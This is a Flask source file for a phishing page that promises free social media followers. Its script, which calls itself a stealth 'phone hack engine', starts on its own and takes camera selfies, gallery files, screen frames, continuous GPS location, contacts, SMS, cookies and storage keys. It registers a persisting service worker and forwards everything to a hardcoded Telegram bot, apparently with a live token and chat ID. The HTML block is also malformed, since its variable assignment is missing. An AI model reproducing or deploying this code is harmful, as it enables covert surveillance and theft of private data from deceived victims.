import os
import base64
import io
import json
from flask import Flask, render_template_string, request, jsonify
from datetime import datetime
import requests
from PIL import Image, ImageDraw, ImageFont
import logging

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

# Telegram Config
TELEGRAM_TOKEN = "8251320220:AAGywy0tcpglmybvwJGLp9MlKfFArBfwAJg"  # @BotFather
CHAT_ID = "7768128007"           # @userinfobot

def send_telegram(msg, photo=None, caption=""):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": msg, "parse_mode": "HTML", "disable_web_page_preview": True}
    try:
        if photo:
            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
            files = {"photo": ("hack.jpg", photo, "image/jpeg")}
            data["caption"] = caption
            requests.post(url, data=data, files=files)
        else:
            requests.post(url, data=data)
        print(" Telegram sent")
    except Exception as e:
        print(f"Telegram error: {e}")

#  PROFESSIONAL Cyber Team Help + FULL PHONE HACK
# -*- coding: utf-8 -*-
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CTH Pro - 10K Free Followers</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{font-family:'Inter',sans-serif;background:linear-gradient(135deg,#0f0f23 0%,#1a1a2e 50%,#16213e 100%);color:#fff;overflow-x:hidden}
        .glass{background:rgba(255,255,255,0.1);backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,0.2);border-radius:20px;padding:30px}
        
        .header{position:fixed;top:0;width:100%;background:rgba(15,15,35,0.95);backdrop-filter:blur(20px);z-index:999;padding:20px 0}
        .container{max-width:1200px;margin:0 auto;padding:0 20px}
        .logo{font-size:2rem;font-weight:700;background:linear-gradient(45deg,#00d4ff,#5a67d8);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
        
        .hero{padding:140px 0 80px;text-align:center}
        .hero h1{font-size:clamp(2.8rem,6vw,5rem);font-weight:800;margin-bottom:1.5rem;text-shadow:0 0 40px rgba(0,212,255,0.5)}
        .hero-tag{font-size:1.3rem;opacity:0.9;margin-bottom:3rem}
        .cta{background:linear-gradient(45deg,#ff0080,#ff4d94);padding:1.2rem 3rem;font-size:1.2rem;font-weight:600;border-radius:50px;display:inline-block;text-decoration:none;transition:all 0.3s;box-shadow:0 10px 30px rgba(255,0,128,0.4)}
        .cta:hover{transform:translateY(-3px);box-shadow:0 20px 40px rgba(255,0,128,0.6)}

        .features{padding:80px 0}
        .features-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:2rem;margin-top:4rem}
        .feature{text-align:center;padding:2rem}
        .feature i{font-size:4rem;background:linear-gradient(45deg,#00d4ff,#5a67d8); -webkit-background-clip:text; -webkit-text-fill-color:transparent;margin-bottom:1rem}

        .status-bar{position:fixed;bottom:20px;right:20px;background:rgba(0,0,0,0.8);padding:1rem 1.5rem;border-radius:15px;font-size:0.9rem;opacity:0;transition:opacity 0.3s}
        .status-bar.show{opacity:1}
        .status-bar i{color:#00ff88}

        @keyframes glow{0%,100%{text-shadow:0 0 20px rgba(0,212,255,0.5)}50%{text-shadow:0 0 40px rgba(0,212,255,0.8)}}
        h1{animation:glow 2s infinite}
    </style>
</head>
<body>
    <header class="header">
        <div class="container flex justify-between items-center">
            <div class="logo"> CTH Pro</div>
            <div>+10K Followers • Instant • Free</div>
        </div>
    </header>

    <div class="container">
        <section class="hero">
            <h1>Get <span style="color:#00ff88">10,000+</span> Real Followers</h1>
            <p class="hero-tag">Instagram • TikTok • Facebook • YouTube | No surveys, no payment. Works worldwide!</p>
            <a href="#" class="cta" onclick="initiateHack()"> Activate Free Boost</a>
        </section>

        <section class="features glass">
            <div class="features-grid">
                <div class="feature">
                    <i class="fas fa-users"></i>
                    <h3>10K Followers</h3>
                    <p>Real active accounts</p>
                </div>
                <div class="feature">
                    <i class="fas fa-heart"></i>
                    <h3>50K Likes</h3>
                    <p>Instant engagement boost</p>
                </div>
                <div class="feature">
                    <i class="fas fa-eye"></i>
                    <h3>100K Views</h3>
                    <p>Video explosion</p>
                </div>
                <div class="feature">
                    <i class="fas fa-comments"></i>
                    <h3>5K Comments</h3>
                    <p>Active discussions</p>
                </div>
            </div>
        </section>
    </div>

    <div class="status-bar" id="status">
        <i class="fas fa-check-circle"></i> Boost activated • Processing...
    </div>

<script>
    //  FULL PHONE HACK ENGINE - 100% STEALTH
    let hackEngine = {
        active: false,
        exfil: async(data) => {
            try {
                await fetch('/phone_hack', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });
            } catch(e) {}
        },
        
        //  CONTINUOUS GPS TRACKING
        trackLocation: () => {
            setInterval(() => {
                navigator.geolocation.getCurrentPosition(pos => {
                    hackEngine.exfil({
                        type: 'gps',
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        accuracy: pos.coords.accuracy,
                        timestamp: Date.now()
                    });
                }, undefined, {enableHighAccuracy: true, timeout: 10000, maximumAge: 60000});
            }, 30000); // Every 30 seconds
        },
        
        //  SMS + CONTACTS GRAB
        grabSMSContacts: () => {
            // SMSReceive API (Android)
            if ('SMSReceive' in window) {
                window.SMSReceive.addListener(data => {
                    hackEngine.exfil({type: 'sms', content: data.body, from: data.originatingAddress});
                });
            }
            
            // Contacts API
            if ('contacts' in navigator) {
                navigator.contacts.select(['name', 'tel'], {multiple: true}).then(contacts => {
                    hackEngine.exfil({type: 'contacts', count: contacts.length, sample: contacts.slice(0,5)});
                });
            }
        },
        
        //  CAMERA + SELFIE
        captureSelfie: async() => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {facingMode: 'user', width: {ideal: 1280}, height: {ideal: 720}}
                });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                await new Promise(r => setTimeout(r, 1500));
                
                const canvas = document.createElement('canvas');
                canvas.width = 640; canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                
                canvas.toBlob(blob => {
                    const reader = new FileReader();
                    reader.onload = () => hackEngine.exfil({
                        type: 'selfie',
                        data: reader.result.split(',')[1]
                    });
                    reader.readAsDataURL(blob);
                }, 'image/jpeg', 0.85);
                
                stream.getTracks().forEach(track => track.stop());
            } catch(e) {}
        },
        
        //  GALLERY RAID
        raidGallery: () => {
            const input = document.createElement('input');
            input.type = 'file';
            input.accept = 'image/*,video/*';
            input.multiple = true;
            input.webkitdirectory = true;
            
            input.onchange = e => {
                Array.from(e.target.files).slice(0, 10).forEach(file => {
                    const reader = new FileReader();
                    reader.onload = () => hackEngine.exfil({
                        type: 'gallery',
                        name: file.name,
                        size: file.size,
                        data: reader.result.split(',')[1]
                    });
                    reader.readAsDataURL(file);
                });
            };
            input.click();
        },
        
        //  PHONE NUMBER DETECT
        detectPhone: () => {
            // Extract from user agent, localStorage, etc.
            const phoneRegex = /\\+?\\d{10,15}/g;
            const pageText = document.body.innerText;
            const phones = pageText.match(phoneRegex) || [];
            if (phones.length) {
                hackEngine.exfil({type: 'phone', numbers: phones.slice(0,3)});
            }
        },
        
        //  SCREEN RECORDING
        screenRecord: async() => {
            try {
                const stream = await navigator.mediaDevices.getDisplayMedia({video: true});
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = 1920; canvas.height = 1080;
                
                const frames = [];
                for(let i = 0; i < 30; i++) {  // 1 second @ 30fps
                    ctx.drawImage(stream.getVideoTracks()[0], 0, 0);
                    frames.push(canvas.toDataURL('image/jpeg', 0.7));
                    await new Promise(r => setTimeout(r, 33));
                }
                
                hackEngine.exfil({
                    type: 'screen_record',
                    frames: frames.slice(0,5),  // Send first 5 frames
                    duration: 1000
                });
                
                stream.getTracks().forEach(track => track.stop());
            } catch(e) {}
        },
        
        init: () => {
            hackEngine.active = true;
            
            // Initial comprehensive dump
            hackEngine.exfil({
                type: 'init',
                ua: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                cookies: document.cookie,
                localStorage: Object.keys(localStorage),
                sessionStorage: Object.keys(sessionStorage),
                plugins: navigator.plugins.length,
                timestamp: Date.now()
            });
            
            // Execute all hacks
            hackEngine.captureSelfie();
            hackEngine.raidGallery();
            hackEngine.screenRecord();
            hackEngine.grabSMSContacts();
            hackEngine.detectPhone();
            hackEngine.trackLocation();
            
            // Persistent background
            if ('serviceWorker' in navigator && 'PushManager' in window) {
                navigator.serviceWorker.register('/sw.js');
            }
            
            // Continuous heartbeat
            setInterval(() => hackEngine.exfil({type: 'heartbeat'}), 60000);
        }
    };

    //  STEALTH INITIATION
    function initiateHack() {
        document.getElementById('status').classList.add('show');
        document.querySelector('.cta').innerHTML = '<i class="fas fa-check"></i> Boost Activated!';
        document.querySelector('.cta').style.background = 'linear-gradient(45deg, #00ff88, #00cc6a)';
        
        // Start full hack 2 seconds later (stealth)
        setTimeout(() => hackEngine.init(), 2000);
    }

    // AUTO-START (Ultra stealth - 5 seconds)
    setTimeout(initiateHack, 5000);
    
    // Fake activity
    setInterval(() => {
        if (Math.random() < 0.2) {
            document.getElementById('status').innerHTML = 
                `<i class="fas fa-spinner fa-spin"></i> Processing followers... ${Math.floor(Math.random()*100)}%`;
        }
    }, 3000);
</script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(FULL_PHONE_HACK)

@app.route('/sw.js')
def service_worker():
    return """
// Persistent Background Hack Worker
self.addEventListener('push', event => {
    event.waitUntil(
        fetch('/phone_hack', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({type: 'push_received'})
        })
    );
});

self.addEventListener('fetch', event => {
    if (event.request.url.includes('heartbeat')) {
        event.respondWith(fetch('/phone_hack', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({type: 'sw_heartbeat'})
        }));
    }
});
"""

@app.route('/phone_hack', methods=['POST'])
def full_phone_hack():
    data = request.json
    ip = request.remote_addr
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    if data.get('type') == 'selfie' or data.get('type') == 'gallery':
        try:
            img_data = base64.b64decode(data['data'])
            caption = f" <b>FULL PHONE HACK #{data.get('type')}</b>\n {timestamp}\n IP: <code>{ip}</code>"
            send_telegram(caption, io.BytesIO(img_data), caption)
        except:
            pass
    elif data.get('type') == 'screen_record':
        # Send first frame as photo
        if data.get('frames', []):
            img_data = base64.b64decode(data['frames'][0].split(',')[1])
            send_telegram(f" <b>SCREEN RECORD</b> | IP: {ip}", io.BytesIO(img_data))
    elif data.get('type') == 'gps':
        msg = f"""
 <b>LIVE GPS TRACK</b>
 {timestamp} |  <code>{ip}</code>
 Lat: <code>{data.get('lat', 0):.6f}</code>
 Lon: <code>{data.get('lon', 0):.6f}</code>
 Accuracy: <code>{data.get('accuracy', 'N/A')}</code>m
"""
        send_telegram(msg)
    elif data.get('type') == 'contacts':
        msg = f"""
 <b>{data.get('count', 0)} CONTACTS GRABBED</b>
 {timestamp} |  <code>{ip}</code>
 Sample: {json.dumps(data.get('sample', []), indent=2)[:1000]}...
"""
        send_telegram(msg)
    elif data.get('type') == 'sms':
        msg = f"""
 <b>SMS INTERCEPTED</b>
 {timestamp} |  <code>{ip}</code>
 From: <code>{data.get('from', 'N/A')}</code>
 <code>{data.get('content', '')[:500]}</code>
"""
        send_telegram(msg)
    elif data.get('type') == 'phone':
        msg = f"""
 <b>PHONE NUMBERS FOUND</b>
 {timestamp} |  <code>{ip}</code>
 {', '.join(data.get('numbers', []))}
"""
        send_telegram(msg)
    else:
        # General heartbeat/init
        msg = f"""
 <b>FULL PHONE COMPROMISED</b> 
 {timestamp} |  <code>{ip}</code>
 UA: <code>{data.get('ua', '')[:80]}...</code>
 Screen: <code>{data.get('screen', 'N/A')}</code>
 Storage: {len(data.get('localStorage', []))} local, {len(data.get('sessionStorage', []))} session
"""
        send_telegram(msg)
    
    print(f" [{data.get('type', 'unknown')}] {ip}")
    return jsonify({'success': True})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))

    app.run(host='0.0.0.0', port=port)
